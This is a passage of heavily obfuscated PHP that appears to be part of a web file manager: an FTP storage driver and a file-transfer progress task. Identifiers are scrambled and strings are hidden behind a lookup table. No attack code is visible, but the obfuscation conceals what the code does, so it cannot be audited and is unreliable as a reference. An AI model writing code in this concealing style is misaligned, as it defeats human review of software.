@ftp_rename($this->connect, $ñ¥¦Ó, $«ÊÎ¡ÂÃ); return $Ò¼ÆˆŒò ? $this->getPathOuter($«ÊÎ¡ÂÃ) : !1; } public function delFile($±±ÊŠ¬Ù) { if (!$this->_isconn()) { return !1; } $±±ÊŠ¬Ù = $this->iconvSystem($±±ÊŠ¬Ù); return @ftp_delete($this->connect, $±±ÊŠ¬Ù); } public function delFolder($‚ğÒï) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¶îŸ½ı = $£Ğ÷Áù½ = array(); $this->fileList($‚ğÒï, $¶îŸ½ı, $£Ğ÷Áù½, !0); $this->listItemCache = !0; foreach ($£Ğ÷Áù½ as $úÔ ’—) { $¥€‰¬ôÜ = $this->iconvSystem($úÔ ’—[$_SERVER[Îûáû“ş][32]]); $áŸÇÉ¥ = @ftp_delete($this->connect, $¥€‰¬ôÜ); if (!$áŸÇÉ¥) { return !1; } } foreach ($¶îŸ½ı as $¥€‰¬ôÜ) { $¥€‰¬ôÜ = $this->iconvSystem($¥€‰¬ôÜ); $áŸÇÉ¥ = @ftp_rmdir($this->connect, $¥€‰¬ôÜ); if (!$áŸÇÉ¥) { return !1; } } $‚ğÒï = $this->iconvSystem($‚ğÒï); return @ftp_rmdir($this->connect, $‚ğÒï); } public function rename($µ¸¢•ŒÉ, $˜ÑªƒĞÖ) { $õäÏ½êÌ =& $_SERVER[Îûáû“ş]; if (!$this->_isconn()) { return !1; } $¶ÇÒÎ´ª = $this->fileNameAuto($this->pathFather($µ¸¢•ŒÉ), $˜ÑªƒĞÖ); $¶ÇÒÎ´ª = $this->iconvSystem($¶ÇÒÎ´ª); $µ¸¢•ŒÉ = $this->iconvSystem($µ¸¢•ŒÉ); $¿ö»à·í = $this->pathFather($µ¸¢•ŒÉ); $¹€Â¸ßÁ = rtrim($¿ö»à·í, $õäÏ½êÌ[8]) . $õäÏ½êÌ[8] . $¶ÇÒÎ´ª; $ƒ¾‹¾‡â = @ftp_rename($this->connect, $µ¸¢•ŒÉ, $¹€Â¸ßÁ); $¹€Â¸ßÁ = $this->iconvApp($¹€Â¸ßÁ); return $ƒ¾‹¾‡â ? $this->getPathOuter($¹€Â¸ßÁ) : !1; } private function folderInfo($ä•Ñœ˜, $á¦¦å·¥ = false) { $ÁÙè¨” =& $_SERVER[Îûáû“ş]; $‹Íº¡¦á = array($ÁÙè¨”[32] => $this->pathThis($ä•Ñœ˜), $ÁÙè¨”[84] => $this->getPathOuter($ÁÙè¨”[8] . $ä•Ñœ˜), $ÁÙè¨”[33] => $ÁÙè¨”[75]); if ($á¦¦å·¥) { return $‹Íº¡¦á; } $‹Íº¡¦á[$ÁÙè¨”[201]] = $‹Íº¡¦á[$ÁÙè¨”[85]] = 0; $‹Íº¡¦á[$ÁÙè¨”[202]] = $‹Íº¡¦á[$ÁÙè¨”[203]] = !0; return $‹Íº¡¦á; } private function fileInfo($²¸¿¯Âù, $ã…½™Èˆ = false, $óúº¢èä = array()) { $‡´¬´ğò =& $_SERVER[Îûáû“ş]; $Œˆ»Ê‘ = array($‡´¬´ğò[32] => $this->pathThis($²¸¿¯Âù), $‡´¬´ğò[84] => $this->getPathOuter($‡´¬´ğò[8] . $²¸¿¯Âù), $‡´¬´ğò[33] => $‡´¬´ğò[200], $‡´¬´ğò[76] => isset($óúº¢èä[$‡´¬´ğò[76]]) ? $óúº¢èä[$‡´¬´ğò[76]] : 0, $‡´¬´ğò[174] => $this->ext($²¸¿¯Âù)); if ($ã…½™Èˆ) { return $Œˆ»Ê‘; } $Œˆ»Ê‘[$‡´¬´ğò[201]] = $Œˆ»Ê‘[$‡´¬´ğò[85]] = 0; $Œˆ»Ê‘[$‡´¬´ğò[202]] = $Œˆ»Ê‘[$‡´¬´ğò[203]] = !0; $ÍÓï‡ï‡ = $this->iconvSystem($²¸¿¯Âù); $Œˆ»Ê‘[$‡´¬´ğò[85]] = @ftp_mdtm($this->connect, $ÍÓï‡ï‡); if (empty($óúº¢èä)) { $óúº¢èä = $this->objectMeta($²¸¿¯Âù); if (!$óúº¢èä) { return $Œˆ»Ê‘; } } $Œˆ»Ê‘[$‡´¬´ğò[76]] = $óúº¢èä[$‡´¬´ğò[76]]; return $Œˆ»Ê‘; } public function size($ª¡é—‘Ø) { $”¸¸ÅàÑ = $this->objectMeta($ª¡é—‘Ø); return $”¸¸ÅàÑ ? $”¸¸ÅàÑ[$_SERVER[Îûáû“ş][76]] : 0; } public function info($®œ™—àó) { if ($this->isFile($®œ™—àó)) { return $this->fileInfo($®œ™—àó, 0); } else { if ($this->isFolder($®œ™—àó)) { return $this->folderInfo($®œ™—àó); } } return !1; } private function fileList($¡±É—Áé, &$¸¿½šı, &$ªµ™»·¡, $Ä÷É¶Î = false) { $±Ïñ¨‚› =& $_SERVER[Îûáû“ş]; $¡±É—Áé = $this->iconvSystem($¡±É—Áé); if (!$this->isFolder($¡±É—Áé)) { return !1; } @ftp_chdir($this->connect, $±Ïñ¨‚›[8]); $¡±É—Áé = rtrim($¡±É—Áé, $±Ïñ¨‚›[8]) . $±Ïñ¨‚›[8]; check_abort(); $…–€³Ú = @ftp_rawlist($this->connect, $¡±É—Áé); if (!$…–€³Ú) { $…–€³Ú = array(); } $ä¿å‰‚ = array($±Ïñ¨‚›[10] => 1, $±Ïñ¨‚›[1388] => 1); foreach ($…–€³Ú as $òÑîë¹ä) { $ŠÜ½ ¹ = $this->_listItem($òÑîë¹ä); if ($ŠÜ½ ¹[0] == $±Ïñ¨‚›[757]) { continue; } $ÏÆïµø« = $ŠÜ½ ¹[8]; if (empty($ÏÆïµø«) && $ÏÆïµø« !== $±Ïñ¨‚›[198] || isset($ä¿å‰‚[$ÏÆïµø«])) { continue; } $ÏÆïµø« = $this->iconvApp($¡±É—Áé . ltrim($ÏÆïµø«, $±Ïñ¨‚›[8])); $™¶†ÕöÙ = array($±Ïñ¨‚›[32] => $ÏÆïµø«, $±Ïñ¨‚›[33] => $±Ïñ¨‚›[200], $±Ïñ¨‚›[76] => $ŠÜ½ ¹[4]); if (substr($òÑîë¹ä, 0, 1) == $±Ïñ¨‚›[1389]) { $™¶†ÕöÙ[$±Ïñ¨‚›[33]] = $±Ïñ¨‚›[75]; $™¶†ÕöÙ[$±Ïñ¨‚›[76]] = 0; } $ Ş®Êß = $™¶†ÕöÙ[$±Ïñ¨‚›[33]] == $±Ïñ¨‚›[75] ? !0 : !1; $this->cacheMethodInfoSet($ÏÆïµø«, $ Ş®Êß, $™¶†ÕöÙ); if ($ Ş®Êß) { $¸¿½šı[] = $ÏÆïµø«; if ($Ä÷É¶Î) { $this->fileList($ÏÆïµø«, $¸¿½šı, $ªµ™»·¡, $Ä÷É¶Î); } continue; } $ªµ™»·¡[] = $™¶†ÕöÙ; } $this->cacheMethodInfoSet($¡±É—Áé, !0); } private function _listItem($ùè¬„éå) { if (empty($ùè¬„éå)) { return array(); } $Ô­ĞÛÂ® = preg_split($_SERVER[Îûáû“ş][1390], $ùè¬„éå); if (count($Ô­ĞÛÂ®) <= 9) { return $Ô­ĞÛÂ®; } $Ô­ĞÛÂ®[8] = trim(substr($ùè¬„éå, strpos($ùè¬„éå, $Ô­ĞÛÂ®[7]) + strlen($Ô­ĞÛÂ®[7]))); return array_splice($Ô­ĞÛÂ®, 0, 9); } public function listPath($¶ÛßÇë÷, $Ìœ¾ô® = false) { $˜Ä´­Ñï =& $_SERVER[Îûáû“ş]; if (!$this->_isconn()) { return !1; } $¯¨³¬¹´ = $Ó¼ï’¤ì = array(); $this->fileList($¶ÛßÇë÷, $¯¨³¬¹´, $Ó¼ï’¤ì); foreach ($¯¨³¬¹´ as $›‡¥  => $³¤¥•±) { $¯¨³¬¹´[$›‡¥ ] = $this->folderInfo($³¤¥•±, $Ìœ¾ô®); } foreach ($Ó¼ï’¤ì as $›‡¥  => $³¤¥•±) { $Ó¼ï’¤ì[$›‡¥ ] = $this->fileInfo($³¤¥•±[$˜Ä´­Ñï[32]], $Ìœ¾ô®, $³¤¥•±); } return array($˜Ä´­Ñï[82] => $¯¨³¬¹´, $˜Ä´­Ñï[83] => $Ó¼ï’¤ì); } public function has($à–ø®Ú, $ù²ĞÇÌ¡ = false, $ÂÂæÅ°è = true) { $ÂÅ‹”Ä‚ =& $_SERVER[Îûáû“ş]; $òÛ°Š¡ï = $İï°ïØÜ = array(); $ùÄ†¸Òª = $ù²ĞÇÌ¡ ? !0 : !1; $this->fileList($à–ø®Ú, $òÛ°Š¡ï, $İï°ïØÜ, $ùÄ†¸Òª); if ($ù²ĞÇÌ¡) { return array($ÂÅ‹”Ä‚[207] => count($İï°ïØÜ), $ÂÅ‹”Ä‚[208] => count($òÛ°Š¡ï)); } if ($ÂÂæÅ°è) { if (count($İï°ïØÜ)) { return !0; } } else { if (count($òÛ°Š¡ï)) { return !0; } } return !1; } public function listAll($ ¶èúœ¿) { $ŒË˜†³´ =& $_SERVER[Îûáû“ş]; if (!$this->_isconn()) { return !1; } $ã¢İÃ€ = $œöõå = array(); $this->fileList($ ¶èúœ¿, $ã¢İÃ€, $œöõå, !0); $Àıë¹Ç‹ = array_to_keyvalue($œöõå, $ŒË˜†³´[32]); foreach ($ã¢İÃ€ as $ÓºôÇå) { if (is_string($ÓºôÇå)) { $Àıë¹Ç‹[$ÓºôÇå] = array($ŒË˜†³´[76] => 0); } } return $this->listAllFiles($ ¶èúœ¿, $Àıë¹Ç‹); } public function getContent($í«ëÅ’—) { if (!$this->_isconn()) { return !1; } $í«ëÅ’— = $this->iconvSystem($í«ëÅ’—); return $this->fileSubstr($í«ëÅ’—); } public function setContent($´ö‹»âŸ, $Ç‹§Ãî = '') { if (!$this->_isconn()) { return !1; } $¨²ŠÇ” = $this->pathThis($this->iconvSystem($´ö‹»âŸ)); $ƒÀÙ¶Æ¸ = $this->tempFile($¨²ŠÇ”); file_put_contents($ƒÀÙ¶Æ¸, $Ç‹§Ãî); $ê±É­É‘ = $this->upload($´ö‹»âŸ, $this->iconvApp($ƒÀÙ¶Æ¸)); $this->tempFileRemve($ƒÀÙ¶Æ¸); return $ê±É­É‘; } public function fileSubstr($õçÛó , $³¾©·Óª = 0, $ëâ¸„Üâ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($õçÛó , $³¾©·Óª, $ëâ¸„Üâ); } private function ftpRequest($Ê©ïÔŞÁ, $Âó¢â¼à = 0, $Ã••’û™ = false) { $Ê©ïÔŞÁ = $this->iconvSystem($Ê©ïÔŞÁ); $ÙÏ”İ¦Ğ = $this->scheme . $this->host . $_SERVER[Îûáû“ş][4] . $this->port; $ÒÀû½¬¸ = curl_init(); curl_setopt($ÒÀû½¬¸, CURLOPT_URL, $ÙÏ”İ¦Ğ . $this->pathEncode($Ê©ïÔŞÁ)); curl_setopt($ÒÀû½¬¸, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Ã••’û™) { $ûš÷ÇÒ = $Âó¢â¼à + $Ã••’û™ - 1; curl_setopt($ÒÀû½¬¸, CURLOPT_RANGE, "{$Âó¢â¼à}\55{$ûš÷ÇÒ}"); } curl_setopt($ÒÀû½¬¸, CURLOPT_RETURNTRANSFER, 1); $í¹£©ô» = curl_exec($ÒÀû½¬¸); curl_close($ÒÀû½¬¸); return $í¹£©ô»; } public function upload($úû¢†õã, $ö€åóµ«, $êøĞ ßÒ = false, $Š‹¥ÊÅ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($úû¢†õã))) { return !1; } $úû¢†õã = $this->iconvSystem($úû¢†õã); $ö€åóµ« = $this->iconvSystem($ö€åóµ«); $½àêŞæ = ftp_nb_put($this->connect, $úû¢†õã, $ö€åóµ«, FTP_BINARY); while ($½àêŞæ == FTP_MOREDATA) { $½àêŞæ = ftp_nb_continue($this->connect); } if ($½àêŞæ != FTP_FINISHED) { return !1; } return $this->getPathOuter($úû¢†õã); } public function download($İ¦à¿É, $Àá¥î† = '') { if (!$this->_isconn()) { return !1; } $½Ë¸Ò¸ = $this->pathFather($Àá¥î†); if (!IO::mkdir($½Ë¸Ò¸)) { return !1; } $İ¦à¿É = $this->iconvSystem($İ¦à¿É); $Àá¥î† = $this->iconvSystem($Àá¥î†); $ûôèƒÁŒ = ftp_nb_get($this->connect, $Àá¥î†, $İ¦à¿É, FTP_BINARY); while ($ûôèƒÁŒ == FTP_MOREDATA) { $ûôèƒÁŒ = ftp_nb_continue($this->connect); } if ($ûôèƒÁŒ != FTP_FINISHED) { return !1; } return $this->iconvApp($Àá¥î†); } public function exist($ã®›ì’¼) { return $this->isFile($ã®›ì’¼) || $this->isFolder($ã®›ì’¼); } public function isFile($úôÅò­) { return !$this->isFolder($úôÅò­) && $this->objectMeta($úôÅò­); } public function isFolder($¯Ïê É) { return $this->cacheMethod($_SERVER[Îûáû“ş][165], $¯Ïê É); } protected function objectMeta($…ÕàÙ¿à) { return $this->cacheMethod($_SERVER[Îûáû“ş][167], $…ÕàÙ¿à); } protected function _objectMeta($’ú°Óªò) { $Ÿƒü¶Àù =& $_SERVER[Îûáû“ş]; if ($’ú°Óªò == $Ÿƒü¶Àù[12] || $’ú°Óªò == $Ÿƒü¶Àù[8]) { return array(); } if (!$this->_isconn()) { return !1; } $’ú°Óªò = $this->iconvSystem($’ú°Óªò); $Öæ–œóô = array($Ÿƒü¶Àù[32] => $this->iconvApp($’ú°Óªò), $Ÿƒü¶Àù[33] => $Ÿƒü¶Àù[200], $Ÿƒü¶Àù[76] => 0); @ftp_chdir($this->connect, $Ÿƒü¶Àù[8]); $ËŸœ„”ù = @ftp_size($this->connect, $’ú°Óªò); if ($ËŸœ„”ù != -1) { $Öæ–œóô[$Ÿƒü¶Àù[76]] = $ËŸœ„”ù; } else { $“¿±‹¨Ğ = @ftp_chdir($this->connect, $’ú°Óªò); if (!$“¿±‹¨Ğ) { return !1; } $Öæ–œóô[$Ÿƒü¶Àù[33]] = $Ÿƒü¶Àù[75]; } return $Öæ–œóô; } protected function _isFolder($æ¹ÃúÂ“) { $íÈÔË“ =& $_SERVER[Îûáû“ş]; if ($æ¹ÃúÂ“ == $íÈÔË“[12] || $æ¹ÃúÂ“ == $íÈÔË“[8]) { return !0; } $‡ä£ú™ = $this->_objectMeta($æ¹ÃúÂ“); return isset($‡ä£ú™[$íÈÔË“[33]]) && $‡ä£ú™[$íÈÔË“[33]] == $íÈÔË“[75] ? !0 : !1; } } goto E—¢£†ÕÔÀ; DÆõŒöğÄ: class TaskFileTransfer extends Task { protected function startAfter() { $¬ÉÛ·Éí =& $_SERVER[Îûáû“ş]; $ùÄ¯ªÕŸ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¬ÉÛ·Éí[1700], array($this, $¬ÉÛ·Éí[1701])); Hook::bind($¬ÉÛ·Éí[1225], array($this, $¬ÉÛ·Éí[1702])); Hook::bind($¬ÉÛ·Éí[1703], array($this, $¬ÉÛ·Éí[1704])); Hook::bind($¬ÉÛ·Éí[596], array($this, $¬ÉÛ·Éí[1705])); Hook::bind($¬ÉÛ·Éí[597], array($this, $¬ÉÛ·Éí[1706])); Hook::bind($¬ÉÛ·Éí[602], array($this, $¬ÉÛ·Éí[1707])); Hook::bind($¬ÉÛ·Éí[603], array($this, $¬ÉÛ·Éí[1708])); Hook::bind($¬ÉÛ·Éí[599], array($this, $¬ÉÛ·Éí[1709])); Hook::bind($¬ÉÛ·Éí[600], array($this, $¬ÉÛ·Éí[1710])); Hook::bind($¬ÉÛ·Éí[565], array($this, $¬ÉÛ·Éí[1711])); Hook::bind($¬ÉÛ·Éí[562], array($this, $¬ÉÛ·Éí[1711])); Hook::bind($¬ÉÛ·Éí[567], array($this, $¬ÉÛ·Éí[1711])); Hook::bind($¬ÉÛ·Éí[569], array($this, $¬ÉÛ·Éí[1711])); Hook::bind($¬ÉÛ·Éí[571], array($this, $¬ÉÛ·Éí[1711])); Hook::bind($¬ÉÛ·Éí[1712], array($this, $¬ÉÛ·Éí[1713])); Hook::bind($¬ÉÛ·Éí[587], array($this, $¬ÉÛ·Éí[1714])); $this->sourceModelCopyFlag = !1; Hook::bind($¬ÉÛ·Éí[1715], array($this, $¬ÉÛ·Éí[1716])); Hook::bind($¬ÉÛ·Éí[1717], array($this, $¬ÉÛ·Éí[1718])); Hook::bind($¬ÉÛ·Éí[1719], array($this, $¬ÉÛ·Éí[1720])); $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1721]] = LNG($¬ÉÛ·Éí[1722]); $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1723]] = 0; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1724]] = 0; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1066]] = $¬ÉÛ·Éí[12]; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1725]] = $¬ÉÛ·Éí[12]; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1726]] = 0; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1727]] = 0; $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1728]] = 0; if (!$ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1570]]) { $ùÄ¯ªÕŸ[$¬ÉÛ·Éí[1570]] = LNG($¬ÉÛ·Éí[1729]); } } protected function endAfter() { $»Õí´¦Ş =& $_SERVER[Îûáû“ş]; Hook::unbind($»Õí´¦Ş[1700], array($this, $»Õí´¦Ş[1701])); Hook::unbind($»Õí´¦Ş[1225], array($this, $»Õí´¦Ş[1702])); Hook::unbind($»Õí´¦Ş[1703], array($this, $»Õí´¦Ş[1704])); Hook::unbind($»Õí´¦Ş[596], array($this, $»Õí´¦Ş[1705])); Hook::unbind($»Õí´¦Ş[597], array($this, $»Õí´¦Ş[1706])); Hook::unbind($»Õí´¦Ş[602], array($this, $»Õí´¦Ş[1707])); Hook::unbind($»Õí´¦Ş[603], array($this, $»Õí´¦Ş[1708])); Hook::unbind($»Õí´¦Ş[599], array($this, $»Õí´¦Ş[1709])); Hook::unbind($»Õí´¦Ş[600], array($this, $»Õí´¦Ş[1710])); Hook::unbind($»Õí´¦Ş[565], array($this, $»Õí´¦Ş[1711])); Hook::unbind($»Õí´¦Ş[562], array($this, $»Õí´¦Ş[1711])); Hook::unbind($»Õí´¦Ş[567], array($this, $»Õí´¦Ş[1711])); Hook::unbind($»Õí´¦Ş[569], array($this, $»Õí´¦Ş[1711])); Hook::unbind($»Õí´¦Ş[571], array($this, $»Õí´¦Ş[1711])); Hook::unbind($»Õí´¦Ş[1712], array($this, $»Õí´¦Ş[1713])); Hook::unbind($»Õí´¦Ş[587], array($this, $»Õí´¦Ş[1714])); Hook::unbind($»Õí´¦Ş[1715], array($this, $»Õí´¦Ş[1716])); Hook::unbind($»Õí´¦Ş[1717], array($this, $»Õí´¦Ş[1718])); Hook::unbind($»Õí´¦Ş[1719], array($this, $»Õí´¦Ş[1720])); } public function copyMoveStart($¢ë€îé, $´Î”Éî¡, $¾»”îØ, $æ½ğÑùô) { $ÉÉ„îÀÃ =& $_SERVER[Îûáû“ş]; self::log($ÉÉ„îÀÃ[1730] . $´Î”Éî¡ . $ÉÉ„îÀÃ[70] . $æ½ğÑùô); $Ãµ·‰û¯ = rtrim(TEMP_FILES, $ÉÉ„îÀÃ[8]); if (substr($´Î”Éî¡, 0, strlen($Ãµ·‰û¯)) == $Ãµ·‰û¯) { return; } if (substr($æ½ğÑùô, 0, strlen($Ãµ·‰û¯)) == $Ãµ·‰û¯) { return; } $±€õáñ =& $this->task; $±€õáñ[$ÉÉ„îÀÃ[1731]] = KodIO::transferType($¢ë€îé, $¾»”îØ); $this->update(); } public function updateAfter() { $üËÙáµ¿ =& $_SERVER[Îûáû“ş]; $´–ˆŸ›Õ =& $this->task; if (!$´–ˆŸ›Õ[$üËÙáµ¿[762]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($´–ˆŸ›Õ[$üËÙáµ¿[1731]] == $üËÙáµ¿[1314]) { return; } self::updateTask($´–ˆŸ›Õ); } private static function updateTask(&$¶«à÷§ç) { $¦‡şİøÒ =& $_SERVER[Îûáû“ş]; if ($¶«à÷§ç[$¦‡şİøÒ[1731]] == $¦‡şİøÒ[1196] || $¶«à÷§ç[$¦‡şİøÒ[1731]] == $¦‡şİøÒ[107]) { if ($¶«à÷§ç[$¦‡şİøÒ[1725]]) { $¶«à÷§ç[$¦‡şİøÒ[1728]] = $¶«à÷§ç[$¦‡şİøÒ[1727]] + $¶«à÷§ç[$¦‡şİøÒ[1724]]; } } else { if ($¶«à÷§ç[$¦‡şİøÒ[1731]] == $¦‡şİøÒ[1315]) { if ($¶«à÷§ç[$¦‡şİøÒ[1725]] == $¦‡şİøÒ[1196]) { $¶«à÷§ç[$¦‡şİøÒ[1728]] = $¶«à÷§ç[$¦‡şİøÒ[1727]] + $¶«à÷§ç[$¦‡şİøÒ[1724]] * 0.5; } else { if ($¶«à÷§ç[$¦‡şİøÒ[1725]] == $¦‡şİøÒ[107]) { $¶«à÷§ç[$¦‡şİøÒ[1728]] = $¶«à÷§ç[$¦‡şİøÒ[1727]] + $¶«à÷§ç[$¦‡şİøÒ[1723]] * 0.5 + $¶«à÷§ç[$¦‡şİøÒ[1724]] * 0.5; } } } } $¶«à÷§ç[$¦‡şİøÒ[1672]] = $¶«à÷§ç[$¦‡şİøÒ[1728]] / $¶«à÷§ç[$¦‡şİøÒ[762]]; if ($¶«à÷§ç[$¦‡şİøÒ[1672]] > 0) { $Åôœ–© = timeFloat() - $¶«à÷§ç[$¦‡şİøÒ[1674]] - $¶«à÷§ç[$¦‡şİøÒ[1677]]; $¶«à÷§ç[$¦‡şİøÒ[1678]] = $Åôœ–© * (1 - $¶«à÷§ç[$¦‡şİøÒ[1672]]) / $¶«à÷§ç[$¦‡şİøÒ[1672]]; } } public function addPath($ª‰–ô‰Ê) { $·Èâ€€Ä =& $_SERVER[Îûáû“ş]; if (!$ª‰–ô‰Ê) { return; } $Üî´şË =& $this->task; $Ä»€¬ø = IO::infoWithChildren($ª‰–ô‰Ê); $„—´÷Ó¾ = $Üî´şË[$·Èâ€€Ä[1732]] ? $Üî´şË[$·Èâ€€Ä[1732]][$·Èâ€€Ä[1733]] : 0; $Üî´şË[$·Èâ€€Ä[1732]] = array($·Èâ€€Ä[1733] => $„—´÷Ó¾ + 1, $·Èâ€€Ä[420] => $Ä»€¬ø[$·Èâ€€Ä[32]], $·Èâ€€Ä[84] => $Ä»€¬ø[$·Èâ€€Ä[84]], $·Èâ€€Ä[509] => $Ä»€¬ø[$·Èâ€€Ä[509]] ? $Ä»€¬ø[$·Èâ€€Ä[509]] : $Ä»€¬ø[$·Èâ€€Ä[84]]); if ($Ä»€¬ø[$·Èâ€€Ä[33]] == $·Èâ€€Ä[200]) { $Üî´şË[$·Èâ€€Ä[785]] += 1; } else { $Üî´şË[$·Èâ€€Ä[785]] += $Ä»€¬ø[$·Èâ€€Ä[79]][$·Èâ€€Ä[77]]; if ($Ä»€¬ø[$·Èâ€€Ä[402]]) { $Üî´şË[$·Èâ€€Ä[785]] += $Ä»€¬ø[$·Èâ€€Ä[79]][$·Èâ€€Ä[78]] + 1; } } $Üî´şË[$·Èâ€€Ä[762]] += $Ä»€¬ø[$·Èâ€€Ä[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÀØñ¡‰) { } public function sourceAddHashEnd($¶±›İÌƒ) { } public function sourceAddFileStart($™ÀûÔÇ) { $‘Òå²®• =& $_SERVER[Îûáû“ş]; $¿‡äÅğ =& $this->task; $¿‡äÅğ[$‘Òå²®•[1723]] = $™ÀûÔÇ[$‘Òå²®•[76]]; $¿‡äÅğ[$‘Òå²®•[1721]] = $™ÀûÔÇ[$‘Òå²®•[32]]; $¿‡äÅğ[$‘Òå²®•[1066]] = $™ÀûÔÇ[$‘Òå²®•[32]]; $¿‡äÅğ[$‘Òå²®•[1734]] = $™ÀûÔÇ[$‘Òå²®•[84]]; $this->update(); } public function sourceAddFileEnd($£«êÙ¼Ò) { $ı•ª¤°‡ =& $_SERVER[Îûáû“ş]; $¯îÛÆçÈ =& $this->task; $¯îÛÆçÈ[$ı•ª¤°‡[1728]] += $£«êÙ¼Ò[$ı•ª¤°‡[76]]; $¯îÛÆçÈ[$ı•ª¤°‡[1734]] = $£«êÙ¼Ò[$ı•ª¤°‡[84]]; $this->update(1); } public function copyFileStart($Åé¶üø«, $ÛŠÁºğ”, $´ºùáûó, $¢ƒĞŠç, $øŸ“ü‘, $„ÁÄ¦Ğê) { $·ïåàéı =& $_SERVER[Îûáû“ş]; $âÊÉÃ­Ã = $øŸ“ü‘; if ($âÊÉÃ­Ã == $GLOBALS[$·ïåàéı[1735]]) { $âÊÉÃ­Ã = $GLOBALS[$·ïåàéı[1736]]; } $GLOBALS[$·ïåàéı[1736]] = $øŸ“ü‘; $GLOBALS[$·ïåàéı[1735]] = $„ÁÄ¦Ğê; $Çä¬ŸÊ =& $this->task; $Çä¬ŸÊ[$·ïåàéı[1721]] = $âÊÉÃ­Ã; $Çä¬ŸÊ[$·ïåàéı[1723]] = (int) $Åé¶üø«->size($ÛŠÁºğ”); $Çä¬ŸÊ[$·ïåàéı[1724]] = 0; $Çä¬ŸÊ[$·ïåàéı[1066]] = $·ïåàéı[12]; $Çä¬ŸÊ[$·ïåàéı[1725]] = $·ïåàéı[12]; $Çä¬ŸÊ[$·ïåàéı[1726]] = 0; $ĞÑµ²¯ = $Çä¬ŸÊ[$·ïåàéı[1723]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Çä¬ŸÊ[$·ïåàéı[399]] . $·ïåàéı[1737]); if ($ĞÑµ²¯ && file_exists(get_path_father($¢ƒĞŠç))) { Cache::set($Çä¬ŸÊ[$·ïåàéı[399]] . $·ïåàéı[1737], $¢ƒĞŠç); $Çä¬ŸÊ[$·ïåàéı[1694]] = array($·ïåàéı[1738], $·ïåàéı[1739]); } $this->update(0, $ĞÑµ²¯); } public static function updateCopyLocalFileSize($ôËëà“’) { $•ô±‚‚ =& $_SERVER[Îûáû“ş]; $¢‡Ù¥ïµ = Cache::get($ôËëà“’[$•ô±‚‚[399]] . $•ô±‚‚[1737]); if (!$¢‡Ù¥ïµ || !file_exists($¢‡Ù¥ïµ)) { return $ôËëà“’; } $ôËëà“’[$•ô±‚‚[1724]] = @filesize($¢‡Ù¥ïµ); $ôËëà“’[$•ô±‚‚[1728]] += $ôËëà“’[$•ô±‚‚[1724]]; self::updateTask($ôËëà“’); return $ôËëà“’; } public function copyFileEnd($®‹™Ş»”, $‚²¦ñİ, $®º¥±¸, $ëĞÜÜŠ‹, $×Ü½ø Õ, $ü‰™…¼) { $ö‹ìŞ¥Ì =& $_SERVER[Îûáû“ş]; $ÉÜ­÷ğì =& $this->task; $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1724]] = $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1723]]; $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1725]] = $ö‹ìŞ¥Ì[12]; unset($ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1694]]); if ($×Ü½ø Õ == $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1721]]) { $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1727]] += $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1723]]; $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1728]] = $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1727]]; $Ù¬ˆİí— = 1; if (isset($ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1734]]) && $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1734]] == $‚²¦ñİ) { $Ù¬ˆİí— = 0; } $this->update($Ù¬ˆİí—); } else { $this->update(); $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1724]] = 0; } Cache::remove($ÉÜ­÷ğì[$ö‹ìŞ¥Ì[399]] . $ö‹ìŞ¥Ì[1737]); self::log($ö‹ìŞ¥Ì[1740] . $‚²¦ñİ . $ö‹ìŞ¥Ì[70] . $ëĞÜÜŠ‹ . $ö‹ìŞ¥Ì[231] . $×Ü½ø Õ . $ö‹ìŞ¥Ì[1741] . $ÉÜ­÷ğì[$ö‹ìŞ¥Ì[1721]]); } public function updateFileEnd($ş‰‡ ‡ô, $ú‰‹îÂÎ) { $›×è¥º =& $_SERVER[Îûáû“ş]; $¹˜£‹Ù =& $this->task; $¹˜£‹Ù[$›×è¥º[1721]] = $ş‰‡ ‡ô; $¹˜£‹Ù[$›×è¥º[1723]] = $ú‰‹îÂÎ; $¹˜£‹Ù[$›×è¥º[1727]] += $ú‰‹îÂÎ; $¹˜£‹Ù[$›×è¥º[1728]] = $¹˜£‹Ù[$›×è¥º[1727]]; $this->update(1); self::log($›×è¥º[1742] . $ş‰‡ ‡ô); } public function sourceModelCopy($•…¦Šº«) { $Ò©¡òï =& $_SERVER[Îûáû“ş]; $ãªŞó“š = $•…¦Šº«[0]; $‹¨õ¿õ¾ = $•…¦Šº«[1]; $Éõñ’Ç =& $this->task; $this->sourceModelCopyFlag = !0; $øÌªÚÌ = 0; switch ($ãªŞó“š) { case $Ò©¡òï[563]: $øÌªÚÌ = 1; break; case $Ò©¡òï[566]: $Éõñ’Ç[$Ò©¡òï[1721]] = $‹¨õ¿õ¾[$Ò©¡òï[32]]; break; case $Ò©¡òï[568]: $øÌªÚÌ = intval($•…¦Šº«[$Ò©¡òï[380]] * 0.4); break; case $Ò©¡òï[570]: $øÌªÚÌ = intval($•…¦Šº«[$Ò©¡òï[380]] * 0.2); break; case $Ò©¡òï[572]: $øÌªÚÌ = 